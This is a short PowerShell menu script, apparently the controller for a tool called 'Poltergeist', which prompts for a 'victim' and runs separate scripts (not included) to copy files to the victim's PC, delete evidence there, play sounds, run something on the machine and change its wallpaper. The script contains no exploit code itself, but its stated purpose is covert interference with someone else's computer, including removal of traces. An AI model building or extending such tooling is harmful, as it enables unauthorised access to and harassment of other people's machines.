$Victim = Read-Host -Prompt 'Who is your victim!!'

for ($num = 1 ; $num -le 1){

Write-Output '(1) Copy to Victims PC'
Write-Output '(2) Delete the evidence from Victims PC'
Write-Output '(3) Play Sounds on Victims PC'
Write-Output '(4) Enable on Victims PC'
Write-Output '(5) Change Victims Wallpaper (BETA)'
Write-Output '(6) End Poltergeist'
Write-Output '(7) Change Victim'
$Option = Read-Host -Prompt 'Enter your Numerical Choice'

if ( 1 -eq $Option )
{
    .\Resources\Scripts\Poltergeist_Copy.ps1
}
if ( 2 -eq $Option )
{
    .\Resources\Scripts\Poltergeist_Delete.ps1
}
if ( 3 -eq $Option )
{
    .\Resources\Scripts\Poltergeist_Sounds.ps1
}
if ( 4 -eq $Option )
{
    .\Resources\Scripts\Run_on_Victim.ps1
}
if ( 5 -eq $Option )
{
    .\Resources\Scripts\Poltergeist_Wallpapers.ps1
}
if ( 6 -eq $Option )
{
    $num = 2
}
if ( 7 -eq $Option )
{
    $Victim = Read-Host -Prompt 'Who is your new victim!!'
}

}